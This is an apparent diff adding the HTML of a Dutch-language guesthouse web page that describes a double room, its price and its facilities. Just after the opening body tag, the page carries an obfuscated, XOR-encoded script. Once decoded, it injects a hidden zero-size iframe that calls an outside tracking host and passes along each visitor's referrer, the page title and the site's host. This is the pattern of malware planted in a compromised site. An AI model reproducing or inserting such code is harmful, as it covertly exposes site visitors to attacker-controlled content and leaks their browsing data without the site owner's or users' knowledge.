@@ -1,0 +1,108 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="nl-nl" lang="nl-nl" >
+<head>
+	  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="" />
+  <meta name="title" content="Rode kamer" />
+  <meta name="author" content="Administrator" />
+  <meta name="description" content="" />
+  <meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
+  <title>Rode kamer</title>
+  <link href="/templates/bg_grijs/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+  <link rel="stylesheet" href="/modules/mod_jflanguageselection/tmpl/mod_jflanguageselection.css" type="text/css" />
+  <script type="text/javascript" src="/media/system/js/mootools.js"></script>
+  <script type="text/javascript" src="/media/system/js/caption.js"></script>
+
+	
+<link rel="shortcut icon" href="/images/favicon.ico" />
+<link rel="stylesheet" href="/templates/system/css/general.css" type="text/css" />
+<link href="/templates/bg_grijs/css/template.css" rel="stylesheet" type="text/css" />
+<link href="/templates/bg_grijs/css/rokslidestrip.css" rel="stylesheet" type="text/css" />
+<link href="/templates/bg_grijs/css/light.css" rel="stylesheet" type="text/css" />
+<link href="/templates/bg_grijs/css/menustyle3-light.css" rel="stylesheet" type="text/css" />
+
+<style type="text/css">
+	div.wrapper { margin: 0 auto; width: 962px;padding:0;}
+	/* clear fixes for pure css layout */
+	</style>	
+<script type="text/javascript" src="/templates/bg_grijs/js/rokslidestrip.js"></script>
+<script type="text/javascript" src="/templates/bg_grijs/js/rokfonts.js"></script>   
+<script type="text/javascript">
+	window.addEvent('load', function() {
+		var modules = ['module','module-menu','module-color1','module-color2','module-color3','module-color4','module-style1','module-style1-color1','module-style1-color2','module-style1-color3','module-style1-color4','module-style2','module-style2-color1','module-style2-color2','module-style2-color3','module-style2-color4'];
+		var header = "h3";
+			    RokBuildSpans(modules, header);
+        	});
+</script>
+	
+<!--[if IE]>
+<script type="text/javascript" src="/templates/bg_grijs/js/ie_suckerfish.js"></script>
+<![endif]-->
+ <link rel="stylesheet" href="/templates/system/css/system.css" type="text/css" /> 
+ <link rel="stylesheet" href="/templates/system/css/general.css" type="text/css" /> 
+ <link rel="stylesheet" href="/templates/bg_grijs/css/template.css" type="text/css" /> 
+ 
+ <link id="JTKLocalCss" href="/css/template.css" rel="stylesheet" type="text/css" />
+ <link href="/templates/bg_grijs/css/kringelhof.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body class="oneColFixCtrHdr">
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+
+<div id="container">
+  <div id="header">
+    <table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td><img src="/templates/bg_grijs/images/logokringelhof.jpg" width="400" height="50" /></td>
+    <td><div id="jflanguageselection"><label for="jflanguageselection" class="jflanguageselection">JFMSELECT</label>
+<select name="lang"  class="jflanguageselection" size="1" onchange="document.location.replace(this.value);">
+	<option value="http://kringelhof.be/index.php?option=com_content&amp;view=article&amp;id=47&amp;itemid=55&amp;lang=nl&amp;Itemid="   selected="selected" >NL</option>
+	<option value="http://kringelhof.be/index.php?option=com_content&amp;view=article&amp;id=47&amp;itemid=55&amp;lang=fr&amp;Itemid="   >FR</option>
+	<option value="http://kringelhof.be/index.php?option=com_content&amp;view=article&amp;id=47&amp;itemid=55&amp;lang=en&amp;Itemid="   >EN</option>
+</select>
+</div><noscript><a href="http://kringelhof.be/index.php?option=com_content&amp;view=article&amp;id=47&amp;itemid=55&amp;lang=nl&amp;Itemid="><span lang="nl" xml:lang="nl">NL</span></a>&nbsp;<a href="http://kringelhof.be/index.php?option=com_content&amp;view=article&amp;id=47&amp;itemid=55&amp;lang=fr&amp;Itemid="><span lang="fr" xml:lang="fr">FR</span></a>&nbsp;<a href="http://kringelhof.be/index.php?option=com_content&amp;view=article&amp;id=47&amp;itemid=55&amp;lang=en&amp;Itemid="><span lang="en" xml:lang="en">EN</span></a>&nbsp;</noscript><!--Joom!fish V2.0 (RC)-->
+<!-- &copy; 2003-2008 Think Network, released under the GPL. -->
+<!-- More information: at http://www.joomfish.net --></td>
+  </tr>
+</table>
+  </div>
+<div id="mainContent">
+    				<div id="horiz-menu" class="splitmenu menustyle3">
+						<div id="horiz-menu2">
+															<ul class="menutop"><li class="item1"><a href="http://kringelhof.be/"><span>Welkom</span></a></li><li class="item53"><a href="/index.php?option=com_content&amp;view=article&amp;id=45&amp;Itemid=53&amp;lang=nl"><span>Het huis</span></a></li><li class="item54"><a href="/index.php?option=com_content&amp;view=article&amp;id=46&amp;Itemid=54&amp;lang=nl"><span>Blauwe kamer</span></a></li><li class="item55"><a href="/index.php?option=com_content&amp;view=article&amp;id=47&amp;Itemid=55&amp;lang=nl"><span>Rode kamer</span></a></li><li class="item56"><a href="/index.php?option=com_content&amp;view=article&amp;id=48&amp;Itemid=56&amp;lang=nl"><span>Tuin</span></a></li><li class="item57"><a href="/index.php?option=com_content&amp;view=article&amp;id=49&amp;Itemid=57&amp;lang=nl"><span>Omgeving</span></a></li><li class="item58"><a href="/index.php?option=com_content&amp;view=article&amp;id=50&amp;Itemid=58&amp;lang=nl"><span>Ontspanning</span></a></li><li class="item59"><a href="/index.php?option=com_content&amp;view=article&amp;id=51&amp;Itemid=59&amp;lang=nl"><span>Info</span></a></li><li class="item60"><a href="/index.php?option=com_rsbook_15&amp;Itemid=60&amp;lang=nl"><span>Contact</span></a></li></ul>								
+						</div>
+					</div>
+ <div id="fotos">
+    <table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td></td>
+    <td></td>
+    <td></td>
+  </tr>
+</table></div>
+
+    
+    
+ 	<br />
+    
+<table class="contentpaneopen">
+
+
+
+<tr>
+<td valign="top">
+<p>Prijs per nacht : €90 (2p) / €75 (1p)</p><p><a href="/index.php?option=com_rsbook_15&amp;Itemid=60&amp;lang=nl">Reserveer</a> deze kamer.<a href="/index.php?option=com_rsbook_15&amp;Itemid=60&amp;lang=nl"></a></p><p><br />Deze tweepersoonskamer werd met veel gevoel voor stijl en harmonie gedecoreerd. Bijzonder aan deze kamer zijn de 'nissen' die permanent dienst doen als wisselende tentoonstellingsruimte. Op dit ogenblik kan je er de sculpturen van KOENRAAD TINEL bewonderen. </p><p>In de kamer beschik je over een dubbel bed met donsdeken, een grote werktafel, ingebouwde kasten met opbergruimte, een cd/radio/MP3speler, wireless internet en een prachtig zicht op de binnenkoer.  Tevens beschik je over een apart toilet en een eigen private badkamer met een ligbad & douche, twee lavabo's en een zitbankje die het comformtabel maakt om zich om te kleden. </p></td>
+</tr>
+
+</table>
+<span class="article_separator">&nbsp;</span>
+
+
+    <!-- end #mainContent --></div>
+  <div id="footer">
+    <p></p>
+    <!-- end #footer --></div>
+<!-- end #container --></div>
+</body>
+</html>
